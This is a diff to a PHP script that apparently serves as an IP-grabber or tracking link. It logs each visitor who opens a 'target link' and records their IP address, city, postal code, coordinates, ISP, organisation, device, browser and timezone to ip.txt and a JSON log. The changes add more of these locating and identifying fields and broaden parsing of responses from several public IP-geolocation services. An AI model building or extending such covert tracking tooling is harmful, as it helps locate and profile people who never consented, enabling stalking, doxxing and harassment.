@@ -51,24 +51,30 @@ $accept_encoding = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Unknown';
 $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
 
 // Create detailed structured log entry
-$log_entry = "╔" . str_repeat("═", 68) . "╗\n";
+$log_entry = "╔" . str_repeat("═", 78) . "╗\n";
 $log_entry .= "║ [" . $timestamp . "] TARGET LINK OPENED\n";
-$log_entry .= "╠" . str_repeat("═", 68) . "╣\n";
+$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
 $log_entry .= "║ IP ADDRESS: " . trim($ipaddress) . "\n";
-$log_entry .= "║ GEOLOCATION: " . $geo_info['country'] . " | " . $geo_info['city'] . " | " . $geo_info['isp'] . "\n";
+$log_entry .= "║ GEOLOCATION: " . $geo_info['country'] . " | " . $geo_info['city'] . " | " . $geo_info['postal_code'] . "\n";
 $log_entry .= "║ COORDINATES: Lat " . $geo_info['latitude'] . " | Lon " . $geo_info['longitude'] . "\n";
-$log_entry .= "╠" . str_repeat("═", 68) . "╣\n";
+$log_entry .= "║ ISP/PROVIDER: " . $geo_info['isp'] . "\n";
+$log_entry .= "║ ORGANIZATION: " . $geo_info['organization'] . "\n";
+$log_entry .= "║ AS NUMBER: " . $geo_info['as_name'] . "\n";
+$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
 $log_entry .= "║ DEVICE INFO:\n";
 $log_entry .= "║   OS: " . $device_info['os'] . "\n";
 $log_entry .= "║   BROWSER: " . $device_info['browser'] . "\n";
 $log_entry .= "║   DEVICE TYPE: " . $device_info['device_type'] . "\n";
 $log_entry .= "║   DEVICE NAME: " . $device_info['device_name'] . "\n";
-$log_entry .= "╠" . str_repeat("═", 68) . "╣\n";
-$log_entry .= "║ LANGUAGE: " . $accept_language . "\n";
-$log_entry .= "║ ENCODING: " . $accept_encoding . "\n";
-$log_entry .= "║ REFERER: " . $referer . "\n";
+$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
+$log_entry .= "║ CONNECTION INFO:\n";
+$log_entry .= "║   LANGUAGE: " . $accept_language . "\n";
+$log_entry .= "║   ENCODING: " . $accept_encoding . "\n";
+$log_entry .= "║   REFERER: " . $referer . "\n";
+$log_entry .= "║   TIMEZONE: " . date('T') . " (UTC" . date('O') . ")\n";
+$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
 $log_entry .= "║ FULL USER-AGENT: " . $browser . "\n";
-$log_entry .= "╚" . str_repeat("═", 68) . "╝\n\n";
+$log_entry .= "╚" . str_repeat("═", 78) . "╝\n\n";
 
 // Write to IP log file
 $file = 'ip.txt';
@@ -87,9 +93,14 @@ $json_entry = [
     'geolocation' => [
         'country' => $geo_info['country'],
         'city' => $geo_info['city'],
+        'postal_code' => $geo_info['postal_code'],
         'isp' => $geo_info['isp'],
+        'as_name' => $geo_info['as_name'],
+        'organization' => $geo_info['organization'],
         'latitude' => $geo_info['latitude'],
-        'longitude' => $geo_info['longitude']
+        'longitude' => $geo_info['longitude'],
+        'timezone' => date('T'),
+        'timezone_offset' => date('O')
     ],
     'device' => [
         'os' => $device_info['os'],
@@ -97,11 +108,16 @@ $json_entry = [
         'device_type' => $device_info['device_type'],
         'device_name' => $device_info['device_name']
     ],
-    'headers' => [
+    'connection' => [
         'user_agent' => $browser,
         'accept_language' => $accept_language,
         'accept_encoding' => $accept_encoding,
         'referer' => $referer
+    ],
+    'server_info' => [
+        'server_time' => $timestamp,
+        'server_timezone' => date('T'),
+        'server_utc_offset' => date('O')
     ],
     'action' => 'link_opened'
 ];
@@ -210,12 +226,12 @@ function get_ip_geolocation($ip) {
                 // Parse different API response formats
                 if (isset($data['country_name'])) {
                     // ipapi.co format
-                    $result['country'] = $data['country_name'] ?? 'Unknown';
+                    $result['country'] = $data['country_name'] ?? $data['country'] ?? 'Unknown';
                     $result['city'] = $data['city'] ?? 'Unknown';
-                    $result['postal_code'] = $data['postal'] ?? 'Unknown';
-                    $result['isp'] = $data['org'] ?? 'Unknown';
-                    $result['as_name'] = $data['asn'] ?? 'Unknown';
-                    $result['organization'] = $data['org'] ?? 'Unknown';
+                    $result['postal_code'] = $data['postal'] ?? $data['postal_code'] ?? 'Unknown';
+                    $result['isp'] = $data['org'] ?? $data['isp'] ?? 'Unknown';
+                    $result['as_name'] = $data['asn'] ?? $data['as_name'] ?? 'Unknown';
+                    $result['organization'] = $data['org'] ?? $data['organization'] ?? 'Unknown';
                     $result['latitude'] = $data['latitude'] ?? 'N/A';
                     $result['longitude'] = $data['longitude'] ?? 'N/A';
                     break;
@@ -230,14 +246,14 @@ function get_ip_geolocation($ip) {
                     $result['latitude'] = $data['lat'] ?? 'N/A';
                     $result['longitude'] = $data['lon'] ?? 'N/A';
                     break;
-                } elseif (isset($data['country_name']) || isset($data['country_code'])) {
-                    // ipwho.is format
-                    $result['country'] = $data['country_name'] ?? $data['country_code'] ?? 'Unknown';
+                } elseif (isset($data['type']) && $data['type'] === 'IPv4') {
+                    // ipwho.is format (different structure)
+                    $result['country'] = $data['country'] ?? 'Unknown';
                     $result['city'] = $data['city'] ?? 'Unknown';
-                    $result['postal_code'] = $data['postal_code'] ?? 'Unknown';
-                    $result['isp'] = $data['isp'] ?? 'Unknown';
-                    $result['as_name'] = $data['asn'] ?? 'Unknown';
-                    $result['organization'] = $data['org'] ?? 'Unknown';
+                    $result['postal_code'] = $data['postal'] ?? 'Unknown';
+                    $result['isp'] = $data['connection']['isp'] ?? 'Unknown';
+                    $result['as_name'] = 'AS' . ($data['connection']['asn'] ?? 'Unknown');
+                    $result['organization'] = $data['connection']['org'] ?? 'Unknown';
                     $result['latitude'] = $data['latitude'] ?? 'N/A';
                     $result['longitude'] = $data['longitude'] ?? 'N/A';
                     break;
